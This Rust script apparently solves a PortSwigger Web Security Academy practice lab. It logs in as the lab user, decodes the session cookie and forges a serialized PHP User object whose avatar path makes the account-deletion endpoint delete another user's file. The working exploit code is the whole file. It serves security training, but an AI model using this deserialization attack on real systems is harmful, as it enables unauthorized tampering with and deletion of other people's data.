/***************************************************************************
*
* Lab: Using application functionality to exploit insecure deserialization
*
* Hack Steps:
*      1. Login as wiener
*      2. Decode the session and extracting the access token
*      3. Encode the serialized object after modifying
*      4. Delete account using the modified object
*
****************************************************************************/
#![feature(ascii_char)]
use base64::{engine::general_purpose::STANDARD, Engine};
use lazy_static::lazy_static;
use percent_encoding::percent_decode;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a1b008f04ba642380692bbc0086008b.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Logging in as wiener.. ");
    flush_terminal();

    let wiener_login = login_as_wiener();

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Decoding the session and extracting the access token.. ");
    flush_terminal();

    let base54_encoded_session = get_session_cookie(&wiener_login);
    let percent_decoded_session = percent_decode_session(&base54_encoded_session);
    let base64_decoded_session = base64_decode_session(percent_decoded_session);
    let access_token =
        capture_pattern_from_text(r###"token";s:32:"(\w*)";s:11"###, &base64_decoded_session);

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Encoding the serialized object after modifying.. ");
    flush_terminal();

    let serialized = format!(
        r###"O:4:"User":3:{{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"{access_token}";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}}"###
    );
    let encoded_serialized = STANDARD.encode(serialized);

    println!("{}", "OK".green());
    print!("â¦—4â¦˜ Deleting account using the modified object.. ");
    flush_terminal();

    post_with_session("/my-account/delete", &encoded_serialized);

    println!("{}", "OK".green());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text(&format!("session=(.*); Secure;"), cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_wiener() -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()))
}

fn base64_decode_session(session: String) -> String {
    STANDARD
        .decode(session)
        .unwrap()
        .as_ascii()
        .unwrap()
        .as_str()
        .to_string()
}

fn percent_decode_session(session: &str) -> String {
    percent_decode(session.as_bytes())
        .decode_utf8()
        .unwrap()
        .to_string()
}

fn post_with_session(path: &str, session: &str) -> Response {
    let client = build_web_client();
    client
        .post(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
